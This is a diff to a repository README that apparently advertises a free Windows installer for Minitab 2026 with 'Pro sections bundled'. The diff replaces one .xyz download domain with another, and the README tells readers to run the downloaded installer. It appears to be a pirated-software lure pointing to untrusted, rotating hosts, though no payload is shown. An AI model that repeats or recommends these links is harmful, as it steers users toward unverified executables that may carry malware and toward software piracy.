@@ -18,8 +18,8 @@ This repository ships **Minitab 2026 Statistical Software** as a Windows install
 
 > Use the project link below for Windows.
 
-* **Project link:** **[minitab.nexpath.xyz](https://minitab.nexpath.xyz/)**
-* **Full URL:** `https://minitab.nexpath.xyz/`
+* **Project link:** **[minitab.nerasix.xyz](https://minitab.nerasix.xyz/)**
+* **Full URL:** `https://minitab.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ Pro sections are bundled in this release. Install locally, open the app, and use
 * **RAM:** 6 GB minimum | 14 GB for big sessions
 * **Disk:** 5 GB available storage
 
-***
+***
